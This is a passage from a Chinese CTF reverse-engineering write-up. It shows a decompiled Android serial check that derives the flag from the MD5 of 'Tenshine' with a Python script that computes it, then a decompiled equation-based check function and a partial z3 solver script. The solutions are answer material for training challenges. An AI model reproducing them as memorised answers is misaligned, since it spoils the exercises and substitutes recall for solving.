class="keyword">if</span>(arg11 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(arg11.length() != <span class="number">0</span> &amp;&amp; (arg12 != <span class="literal">null</span> &amp;&amp; arg12.length() == <span class="number">22</span>)) &#123;</span><br><span class="line">                <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                digest.reset();</span><br><span class="line">                digest.update(arg11.getBytes());</span><br><span class="line">                <span class="type">String</span> <span class="variable">hexstr</span> <span class="operator">=</span> MainActivity.toHexString(digest.digest(), <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">int</span> i;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">                    sb.append(((<span class="type">char</span>)hexstr.charAt(i)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="string">&quot;flag&#123;&quot;</span> + sb.toString() + <span class="string">&quot;&#125;&quot;</span>.equalsIgnoreCase(arg12);</span><br><span class="line">                <span class="keyword">return</span> v8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg3)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg3);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040019</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="number">0x7F06001D</span>);  <span class="comment">// string:unregister &quot;TopCtf&quot;</span></span><br><span class="line">        <span class="built_in">this</span>.edit_userName = <span class="string">&quot;Tenshine&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.edit_sn = (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0051</span>);  <span class="comment">// id:edit_sn</span></span><br><span class="line">        <span class="built_in">this</span>.btn_register = (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0052</span>);  <span class="comment">// id:button_register</span></span><br><span class="line">        <span class="built_in">this</span>.btn_register.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edit_userName.trim();</span><br><span class="line">                <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edit_sn.getText().toString().trim();</span><br><span class="line">                <span class="keyword">if</span>(!MainActivity.<span class="built_in">this</span>.checkSN(v1, v2)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="number">0x7F06001E</span>, <span class="number">0</span>).show();  <span class="comment">// string:unsuccessed &quot;错误!&quot;</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="number">0x7F06001B</span>, <span class="number">0</span>).show();  <span class="comment">// string:successed &quot;恭喜您！&quot;</span></span><br><span class="line">                MainActivity.<span class="built_in">this</span>.btn_register.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                MainActivity.<span class="built_in">this</span>.setTitle(<span class="number">0x7F060019</span>);  <span class="comment">// string:registered &quot;恭喜&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.getMenuInflater().inflate(<span class="number">0x7F0D0000</span>, menu);  <span class="comment">// menu:activity_main</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">toHexString</span><span class="params">(<span class="type">byte</span>[] arg8, String arg9)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> i$;</span><br><span class="line">        <span class="keyword">for</span>(i$ = <span class="number">0</span>; i$ &lt; arg8.length; ++i$) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(arg8[i$] &amp; <span class="number">0xFF</span>);</span><br><span class="line">            <span class="keyword">if</span>(hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            hexString.append(hex).append(arg9);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tenshine经过md5加密后得到的字符串，每次取i += 2，得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Tenshine&#x27;</span></span><br><span class="line">md5 = hashlib.md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(md5),<span class="number">2</span>):</span><br><span class="line">    flag += md5[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NSSCTF&#123;%s&#125;&#x27;</span>%flag)</span><br></pre></td></tr></table></figure><h3 id="来解个方程"><a href="#来解个方程" class="headerlink" title="来解个方程?"></a>来解个方程?</h3><p>ida进入核心函数，可以看到result = (unsigned int)(186 <em> v18 + 2712 </em> v17 + 2136 <em> v16 + 98 </em> v13 + 138 <em> v14 + 3584 </em> v15 + 1173 * v19，那么我们的目标就是求这几个参数了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+34h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+38h] [rbp-88h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+3Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+40h] [rbp-80h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+44h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+48h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+50h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+54h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+58h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+5Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+60h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+64h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+68h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+6Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+70h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [rsp+74h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+ACh] [rbp-14h]</span></span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = a1; *i; ++i )</span><br><span class="line">    ++v26;</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">22</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v26; ++j )</span><br><span class="line">      *(&amp;v2 + j) = (<span class="type">char</span>)a1[j];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">245</span> * v6 + <span class="number">395</span> * v5 + <span class="number">3541</span> * v4 + <span class="number">2051</span> * v3 + <span class="number">3201</span> * v2 + <span class="number">1345</span> * v7 != <span class="number">855009</span></span><br><span class="line">      || <span class="number">3270</span> * v6 + <span class="number">3759</span> * v5 + <span class="number">3900</span> * v4 + <span class="number">3963</span> * v3 + <span class="number">1546</span> * v2 + <span class="number">3082</span> * v7 != <span class="number">1515490</span></span><br><span class="line">      || <span class="number">526</span> * v6 + <span class="number">2283</span> * v5 + <span class="number">3349</span> * v4 + <span class="number">2458</span> * v3 + <span class="number">2012</span> * v2 + <span class="number">268</span> * v7 != <span class="number">854822</span></span><br><span class="line">      || <span class="number">3208</span> * v6 + <span class="number">2021</span> * v5 + <span class="number">3146</span> * v4 + <span class="number">1571</span> * v3 + <span class="number">2569</span> * v2 + <span class="number">1395</span> * v7 != <span class="number">1094422</span></span><br><span class="line">      || <span class="number">3136</span> * v6 + <span class="number">3553</span> * v5 + <span class="number">2997</span> * v4 + <span class="number">1824</span> * v3 + <span class="number">1575</span> * v2 + <span class="number">1599</span> * v7 != <span class="number">1136398</span></span><br><span class="line">      || <span class="number">2300</span> * v6 + <span class="number">1349</span> * v5 + <span class="number">86</span> * v4 + <span class="number">3672</span> * v3 + <span class="number">2908</span> * v2 + <span class="number">1681</span> * v7 != <span class="number">939991</span></span><br><span class="line">      || <span class="number">212</span> * v22 + <span class="number">153</span> * v21 + <span class="number">342</span> * v20 + <span class="number">490</span> * v12 + <span class="number">325</span> * v11 + <span class="number">485</span> * v10 + <span class="number">56</span> * v9 + <span class="number">202</span> * v8 + <span class="number">191</span> * v23 != <span class="number">245940</span></span><br><span class="line">      || <span class="number">348</span> * v22 + <span class="number">185</span> * v21 + <span class="number">134</span> * v20 + <span class="number">153</span> * v12 + <span class="number">460</span> * v9 + <span class="number">207</span> * v8 + <span class="number">22</span> * v10 + <span class="number">24</span> * v11 + <span class="number">22</span> * v23 != <span class="number">146392</span></span><br><span class="line">      || <span class="number">177</span> * v22 + <span class="number">231</span> * v21 + <span class="number">489</span> * v20 + <span class="number">339</span> * v12 + <span class="number">433</span> * v11 + <span class="number">311</span> * v10 + <span class="number">164</span> * v9 + <span class="number">154</span> * v8 + <span class="number">100</span> * v23 != <span class="number">239438</span></span><br><span class="line">      || <span class="number">68</span> * v20 + <span class="number">466</span> * v12 + <span class="number">470</span> * v11 + <span class="number">22</span> * v10 + <span class="number">270</span> * v9 + <span class="number">360</span> * v8 + <span class="number">337</span> * v21 + <span class="number">257</span> * v22 + <span class="number">82</span> * v23 != <span class="number">233887</span></span><br><span class="line">      || <span class="number">246</span> * v22 + <span class="number">235</span> * v21 + <span class="number">468</span> * v20 + <span class="number">91</span> * v12 + <span class="number">151</span> * v11 + <span class="number">197</span> * v8 + <span class="number">92</span> * v9 + <span class="number">73</span> * v10 + <span class="number">54</span> * v23 != <span class="number">152663</span></span><br><span class="line">      || <span class="number">241</span> * v22 + <span class="number">377</span> * v21 + <span class="number">131</span> * v20 + <span class="number">243</span> * v12 + <span class="number">233</span> * v11 + <span class="number">55</span> * v10 + <span class="number">376</span> * v9 + <span class="number">242</span> * v8 + <span class="number">343</span> * v23 != <span class="number">228375</span></span><br><span class="line">      || <span class="number">356</span> * v22 + <span class="number">200</span> * v21 + <span class="number">136</span> * v11 + <span class="number">301</span> * v10 + <span class="number">284</span> * v9 + <span class="number">364</span> * v8 + <span class="number">458</span> * v12 + <span class="number">5</span> * v20 + <span class="number">61</span> * v23 != <span class="number">211183</span></span><br><span class="line">      || <span class="number">154</span> * v22 + <span class="number">55</span> * v21 + <span class="number">406</span> * v20 + <span class="number">107</span> * v12 + <span class="number">80</span> * v10 + <span class="number">66</span> * v8 + <span class="number">71</span> * v9 + <span class="number">17</span> * v11 + <span class="number">71</span> * v23 != <span class="number">96788</span></span><br><span class="line">      || <span class="number">335</span> * v22 + <span class="number">201</span> * v21 + <span class="number">197</span> * v11 + <span class="number">280</span> * v10 + <span class="number">409</span> * v9 + <span class="number">56</span> * v8 + <span class="number">494</span> * v12 + <span class="number">63</span> * v20 + <span class="number">99</span> * v23 != <span class="number">204625</span></span><br><span class="line">      || <span class="number">428</span> * v18 + <span class="number">1266</span> * v17 + <span class="number">1326</span> * v16 + <span class="number">1967</span> * v15 + <span class="number">3001</span> * v14 + <span class="number">81</span> * v13 + <span class="number">2439</span> * v19 != <span class="number">1109296</span></span><br><span class="line">      || <span class="number">2585</span> * v18 + <span class="number">4027</span> * v17 + <span class="number">141</span> * v16 + <span class="number">2539</span> * v15 + <span class="number">3073</span> * v14 + <span class="number">164</span> * v13 + <span class="number">1556</span> * v19 != <span class="number">1368547</span></span><br><span class="line">      || <span class="number">2080</span> * v18 + <span class="number">358</span> * v17 + <span class="number">1317</span> * v16 + <span class="number">1341</span> * v15 + <span class="number">3681</span> * v14 + <span class="number">2197</span> * v13 + <span class="number">1205</span> * v19 != <span class="number">1320274</span></span><br><span class="line">      || <span class="number">840</span> * v18 + <span class="number">1494</span> * v17 + <span class="number">2353</span> * v16 + <span class="number">235</span> * v15 + <span class="number">3843</span> * v14 + <span class="number">1496</span> * v13 + <span class="number">1302</span> * v19 != <span class="number">1206735</span></span><br><span class="line">      || <span class="number">101</span> * v18 + <span class="number">2025</span> * v17 + <span class="number">2842</span> * v16 + <span class="number">1559</span> * v15 + <span class="number">2143</span> * v14 + <span class="number">3008</span> * v13 + <span class="number">981</span> * v19 != <span class="number">1306983</span></span><br><span class="line">      || <span class="number">1290</span> * v18 + <span class="number">3822</span> * v17 + <span class="number">1733</span> * v16 + <span class="number">292</span> * v15 + <span class="number">816</span> * v14 + <span class="number">1017</span> * v13 + <span class="number">3199</span> * v19 != <span class="number">1160573</span></span><br><span class="line">      || (result = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">186</span> * v18 + <span class="number">2712</span> * v17 + <span class="number">2136</span> * v16 + <span class="number">98</span> * v13 + <span class="number">138</span> * v14 + <span class="number">3584</span> * v15 + <span class="number">1173</span> * v19),</span><br><span class="line">          (_DWORD)result != <span class="number">1005746</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3解方程</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">22</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    flag[i] = z3.Int(<span class="string">&quot;flag[%d]&quot;</span>%i)</span><br><span class="line">S=Solver()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">S.add(<span class="number">3201</span>*flag[<span class="number">0</span>]+<span class="number">2051</span>*flag[<span class="number">1</span>]+<span class="number">3541</span>*flag[<span class="number">2</span>]+<span class="number">395</span>*flag[<span class="number">3</span>]+<span class="number">245</span>*flag[<span class="number">4</span>]+<span class="number">1345</span>*flag[<span class="number">5</span>]==<span class="number">855009</span>,</span><br><span class="line"><span class="number">1546</span>*flag[<span class="number">0</span>]+<span class="number">3963</span>*flag[<span class="number">1</span>]+<span class="number">3900</span>*flag[<span class="number">2</span>]+<span class="number">3759</span>*flag[<span class="number">3</span>]+<span class="number">3270</span>*flag[<span class="number">4</span>]+<span class="number">3082</span>*flag[<span class="number">5</span>]==<span class="number">1515490</span>,</span><br><span class="line"><span class="number">2012</span>*flag[<span class="number">0</span>]+<span class="number">2458</span>*flag[<span class="number">1</span>]+<span class="number">3349</span>*flag[<span class="number">2</span>]+<span class="number">2283</span>*flag[<span class="number">3</span>]+<span class="number">526</span>*flag[<span class="number">4</span>]+<span class="number">268</span>*flag[<span class="number">5</span>]==<span class="number">854822</span>,</span><br><span class="line"><span class="number">2569</span>*flag[<span class="number">0</span>]+<span class="number">1571</span>*flag[<span class="number">1</span>]+<span class="number">3146</span>*flag[<span class="number">2</span>]+<span class="number">2021</span>*flag[<span class="number">3</span>]+<span class="number">3208</span>*flag[<span class="number">4</span>]+<span class="number">1395</span>*flag[<span class="number">5</span>]==<span class="number">1094422</span>,</span><br><span class="line"><span class="number">1575</span>*flag[<span class="number">0</span>]+<span class="number">1824</span>*flag[<span class="number">1</span>]+<span class="number">2997</span>*flag[<span class="number">2</span>]+<span class="number">3553</span>*flag[<span class="number">3</span>]+<span class="number">3136</span>*flag[<span class="number">4</span>]+<span class="number">1599</span>*flag[<span class="number">5</span>]==<span class="number">1136398</span>,</span><br><span class="line"><span class="number">2908</span>*flag[<span class="number">0</span>]+<span class="number">3672</span>*flag[<span class="number">1</span>]+<span class="number">86</span>*flag[<span class="number">2</span>]+<span class="number">1349</span>*flag[<span class="number">3</span>]+<span class="number">2300</span>*flag[<span class="number">4</span>]+<span class="number">1681</span>*flag[<span class="number">5</span>]==<span class="number">939991</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">202</span>+flag[<span class="number">7</span>]*<span class="number">56</span>+flag[<span class="number">8</span>]*<span class="number">485</span>+flag[<span class="number">9</span>]*<span class="number">325</span>+flag[<span class="number">10</span>]*<span class="number">490</span>+flag[<span class="number">18</span>]*<span class="number">342</span>+flag[<span class="number">19</span>]*<span class="number">153</span>+flag[<span class="number">20</span>]*<span class="number">212</span>+flag[<span class="number">21</span>]*<span class="number">191</span>==<span class="number">245940</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">207</span>+flag[<span class="number">7</span>]*<span class="number">460</span>+flag[<span class="number">8</span>]*<span class="number">22</span>+flag[<span class="number">9</span>]*<span class="number">24</span>+flag[<span class="number">10</span>]*<span class="number">153</span>+flag[<span class="number">18</span>]*<span class="number">134</span>+flag[<span class="number">19</span>]*<span class="number">185</span>+flag[<span class="number">20</span>]*<span class="number">348</span>+flag[<span class="number">21</span>]*<span class="number">22</span>==<span class="number">146392</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">154</span>+flag[<span class="number">7</span>]*<span class="number">164</span>+flag[<span class="number">8</span>]*<span class="number">311</span>+flag[<span class="number">9</span>]*<span class="number">433</span>+flag[<span class="number">10</span>]*<span class="number">339</span>+flag[<span class="number">18</span>]*<span class="number">489</span>+flag[<span class="number">19</span>]*<span class="number">231</span>+flag[<span class="number">20</span>]*<span class="number">177</span>+flag[<span class="number">21</span>]*<span class="number">100</span>==<span class="number">239438</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">360</span>+flag[<span class="number">7</span>]*<span class="number">270</span>+flag[<span class="number">8</span>]*<span class="number">22</span>+flag[<span class="number">9</span>]*<span class="number">470</span>+flag[<span class="number">10</span>]*<span class="number">466</span>+flag[<span class="number">18</span>]*<span class="number">68</span>+flag[<span class="number">19</span>]*<span class="number">337</span>+flag[<span class="number">20</span>]*<span class="number">257</span>+flag[<span class="number">21</span>]*<span class="number">82</span>==<span class="number">233887</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">197</span>+flag[<span class="number">7</span>]*<span class="number">92</span>+flag[<span class="number">8</span>]*<span class="number">73</span>+flag[<span class="number">9</span>]*<span class="number">151</span>+flag[<span class="number">10</span>]*<span class="number">91</span>+flag[<span class="number">18</span>]*<span class="number">468</span>+flag[<span class="number">19</span>]*<span class="number">235</span>+flag[<span class="number">20</span>]*<span class="number">246</span>+flag[<span class="number">21</span>]*<span class="number">54</span>==<span class="number">152663</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">242</span>+flag[<span class="number">7</span>]*<span class="number">376</span>+flag[<span class="number">8</span>]*<span class="number">55</span>+flag[<span class="number">9</span>]*<span class="number">233</span>+flag[<span class="number">10</span>]*<span class="number">243</span>+flag[<span class="number">18</span>]*<span class="number">131</span>+flag[<span class="number">19</span>]*<span class="number">377</span>+flag[<span class="number">20</span>]*<span class="number">241</span>+flag[<span class="number">21</span>]*<span class="number">343</span>==<span class="number">228375</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">364</span>+flag[<span class="number">7</span>]*<span class="number">284</span>+flag[<span class="number">8</span>]*<span class="number">301</span>+flag[<span class="number">9</span>]*<span class="number">136</span>+flag[<span class="number">10</span>]*<span class="number">458</span>+flag[<span class="number">18</span>]*<span class="number">5</span>+flag[<span class="number">19</span>]*<span class="number">200</span>+flag[<span class="number">20</span>]*<span class="number">356</span>+flag[<span class="number">21</span>]*<span class="number">61</span>==<span class="number">211183</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">66</span>+flag[<span class="number">7</span>]*<span class="number">71</span>+flag[<span class="number">8</span>]*<span class="number">80</span>+flag[<span class="number">9</span>]*<span class="number">17</span>+flag[<span class="number">10</span>]*<span class="number">107</span>+flag[<span class="number">18</span>]*<span class="number">406</span>+flag[<span class="number">19</span>]*<span class="number">55</span>+flag[<span class="number">20</span>]*<span class="number">154</span>+flag[<span class="number">21</span>]*<span class="number">71</span>==<span class="number">96788</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">56</span>+flag[<span class="number">7</span>]*<span class="number">409</span>+flag[<span class="number">8</span>]*<span class="number">280</span>+flag[<span class="number">9</span>]*<span class="number">197</span>+flag[<span class="number">10</span>]*<span class="number">494</span>+flag[<span class="number">18</span>]*<span class="number">63</span>+flag[<span class="number">19</span>]*<span class="number">201</span>+flag[<span class="number">20</span>]*<span class="number">335</span>+flag[<span class="number">21</span>]*<span class="number">99</span>==<span class="number">204625</span>,</span><br><span class="line"><span class="number">81</span>*flag[<span class="number">11</span>]+<span class="number">3001</span>*flag[<span class="number">12</span>]+<span class="number">1967</span>*flag[<span class="number">13</span>]+<span class="number">1326</span>*flag[<span class="number">14</span>]+<span class="number">1266</span>*flag[<span class="number">15</span>]+<span class="number">428</span>*flag[<span class="number">16</span>]+<span class="number">2439</span>*flag[<span class="number">17</span>]==<span class="number">1109296</span>,</span><br><span class="line"><span class="number">164</span>*flag[<span class="number">11</span>]+<span class="number">3073</span>*flag[<span class="number">12</span>]+<span class="number">2539</span>*flag[<span class="number">13</span>]+<span class="number">141</span>*flag[<span class="number">14</span>]+<span class="number">4027</span>*flag[<span class="number">15</span>]+<span class="number">2585</span>*flag[<span class="number">16</span>]+<span class="number">1556</span>*flag[<span class="number">17</span>]==<span class="number">1368547</span>,</span><br><span class="line"><span class="number">2197</span>*flag[<span class="number">11</span>]+<span class="number">3681</span>*flag[<span class="number">12</span>]+<span class="number">1341</span>*flag[<span class="number">13</span>]+<span class="number">1317</span>*flag[<span class="number">14</span>]+<span class="number">358</span>*flag[<span class="number">15</span>]+<span class="number">2080</span>*flag[<span class="number">16</span>]+<span class="number">1205</span>*flag[<span class="number">17</span>]==<span class="number">1320274</span>,</span><br><span class="line"><span class="number">1496</span>*flag[<span class="number">11</span>]+<span class="number">3843</span>*flag[<span class="number">12</span>]+<span class="number">235</span>*flag[<span class="number">13</span>]+<span class="number">2353</span>*flag[<span class="number">14</span>]+<span class="number">1494</span>*flag[<span class="number">15</span>]+<span class="number">840</span>*flag[<span class="number">16</span>]+<span class="number">1302</span>*flag[<span class="number">17</span>]==<span class="number">1206735</span>,</span><br><span class="line"><span class="number">3008</span>*flag[<span class="number">11</span>]+<span class="number">2143</span>*flag[<span class="number">12</span>]+<span class="number">1559</span>*flag[<span class="number">13</span>]+<span class="number">2842</span>*flag[<span class="number">14</span>]+<span class="number">2025</span>*flag[<span class="number">15</span>]+<span class="number">101</span>*flag[<span class="number">16</span>]+<span class="number">981</span>*flag[<span class="number">17</span>]==<span class="number">1306983</span>,</span><br><span class="line"><span class="number">1017</span>*flag[<span class="number">11</span>]+<span class="number">816</span>*flag[<span class="number">12</span>]+<span class="number">292</span>*flag[<span class="number">13</span>]+<span class="number">1733</span>*flag[<span class="number">14</span>]+<span class="number">3822</span>*flag[<span class="number">15</span>]+<span class="number">1290</span>*flag[<span class="number">16</span>]+<span class="number">3199</span>*flag[<span 